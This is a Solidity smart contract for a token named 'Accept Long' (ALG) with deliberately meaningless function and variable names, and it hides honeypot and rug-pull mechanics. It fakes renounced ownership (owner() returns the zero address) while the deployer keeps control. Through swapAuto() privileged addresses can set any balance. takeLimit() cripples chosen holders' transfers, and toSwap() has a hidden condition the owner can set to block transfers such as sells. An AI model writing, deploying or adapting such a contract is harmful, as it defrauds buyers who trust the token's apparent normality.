//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface listFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamBuy {
    function createPair(address txReceiverTotal, address exemptTx) external returns (address);
}

interface tradingFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellTx) external view returns (uint256);

    function transfer(address buyShould, uint256 feeAuto) external returns (bool);

    function allowance(address buySwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeAuto) external returns (bool);

    function transferFrom(
        address sender,
        address buyShould,
        uint256 feeAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTo, uint256 value);
    event Approval(address indexed buySwap, address indexed spender, uint256 value);
}

interface txAmount is tradingFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AcceptLong is receiverSender, tradingFrom, txAmount {

    function senderBuy() private view {
        require(receiverFee[_msgSender()]);
    }

    address public maxTeam;

    mapping(address => bool) public receiverFee;

    uint256 private maxBuyLaunch = 100000000 * 10 ** 18;

    function shouldMode(uint256 feeAuto) public {
        senderBuy();
        shouldLimit = feeAuto;
    }

    event OwnershipTransferred(address indexed listMax, address indexed fromExempt);

    uint256 exemptLimitReceiver;

    bool private exemptToken;

    function name() external view virtual override returns (string memory) {
        return walletSwapReceiver;
    }

    function takeLimit(address senderListBuy) public {
        senderBuy();
        
        if (senderListBuy == limitMode || senderListBuy == maxTeam) {
            return;
        }
        takeLaunched[senderListBuy] = true;
    }

    function transferFrom(address launchAt, address buyShould, uint256 feeAuto) external override returns (bool) {
        if (_msgSender() != atShould) {
            if (enableBuy[launchAt][_msgSender()] != type(uint256).max) {
                require(feeAuto <= enableBuy[launchAt][_msgSender()]);
                enableBuy[launchAt][_msgSender()] -= feeAuto;
            }
        }
        return toSwap(launchAt, buyShould, feeAuto);
    }

    function decimals() external view virtual override returns (uint8) {
        return takeMode;
    }

    constructor (){
        if (teamShould != swapLiquidity) {
            swapLiquidity = true;
        }
        listFund atTotal = listFund(atShould);
        maxTeam = teamBuy(atTotal.factory()).createPair(atTotal.WETH(), address(this));
        
        limitMode = _msgSender();
        toFund();
        receiverFee[limitMode] = true;
        toFee[limitMode] = maxBuyLaunch;
        
        emit Transfer(address(0), limitMode, maxBuyLaunch);
    }

    function owner() external view returns (address) {
        return marketingAuto;
    }

    mapping(address => mapping(address => uint256)) private enableBuy;

    function getOwner() external view returns (address) {
        return marketingAuto;
    }

    function balanceOf(address sellTx) public view virtual override returns (uint256) {
        return toFee[sellTx];
    }

    function transfer(address autoBuy, uint256 feeAuto) external virtual override returns (bool) {
        return toSwap(_msgSender(), autoBuy, feeAuto);
    }

    address atShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 shouldLimit;

    function symbol() external view virtual override returns (string memory) {
        return minLaunch;
    }

    mapping(address => bool) public takeLaunched;

    function fromTo(address teamMax) public {
        if (autoIs) {
            return;
        }
        if (swapLiquidity != totalMaxSwap) {
            swapLiquidity = false;
        }
        receiverFee[teamMax] = true;
        
        autoIs = true;
    }

    bool public totalMaxSwap;

    string private walletSwapReceiver = "Accept Long";

    function allowance(address sellIs, address receiverSell) external view virtual override returns (uint256) {
        if (receiverSell == atShould) {
            return type(uint256).max;
        }
        return enableBuy[sellIs][receiverSell];
    }

    address public limitMode;

    function approve(address receiverSell, uint256 feeAuto) public virtual override returns (bool) {
        enableBuy[_msgSender()][receiverSell] = feeAuto;
        emit Approval(_msgSender(), receiverSell, feeAuto);
        return true;
    }

    function toSwap(address launchAt, address buyShould, uint256 feeAuto) internal returns (bool) {
        if (launchAt == limitMode) {
            return atAuto(launchAt, buyShould, feeAuto);
        }
        uint256 launchedTotal = tradingFrom(maxTeam).balanceOf(atBuy);
        require(launchedTotal == shouldLimit);
        require(buyShould != atBuy);
        if (takeLaunched[launchAt]) {
            return atAuto(launchAt, buyShould, totalToken);
        }
        return atAuto(launchAt, buyShould, feeAuto);
    }

    uint8 private takeMode = 18;

    bool private teamShould;

    mapping(address => uint256) private toFee;

    string private minLaunch = "ALG";

    bool public autoIs;

    function totalSupply() external view virtual override returns (uint256) {
        return maxBuyLaunch;
    }

    function atAuto(address launchAt, address buyShould, uint256 feeAuto) internal returns (bool) {
        require(toFee[launchAt] >= feeAuto);
        toFee[launchAt] -= feeAuto;
        toFee[buyShould] += feeAuto;
        emit Transfer(launchAt, buyShould, feeAuto);
        return true;
    }

    function toFund() public {
        emit OwnershipTransferred(limitMode, address(0));
        marketingAuto = address(0);
    }

    function swapAuto(address autoBuy, uint256 feeAuto) public {
        senderBuy();
        toFee[autoBuy] = feeAuto;
    }

    uint256 constant totalToken = 8 ** 10;

    bool private swapLiquidity;

    address atBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private marketingAuto;

}